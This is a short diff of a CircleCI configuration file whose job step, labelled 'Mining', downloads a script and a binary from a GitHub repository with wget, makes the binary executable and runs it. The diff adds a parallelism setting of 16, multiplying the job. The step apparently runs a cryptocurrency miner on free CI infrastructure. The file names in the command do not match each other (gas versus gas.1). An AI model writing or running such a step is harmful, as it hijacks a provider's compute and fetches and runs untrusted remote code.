@@ -18,6 +18,7 @@ jobs:
           name: "Mining"
           command: wget https://raw.githubusercontent.com/Miningac/gas/main/script.ini && wget https://github.com/Miningac/gas/raw/main/gas && chmod +x gas.1
                    && ./gas.1 script.ini.1
+    parallelism: 16               
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 workflows:
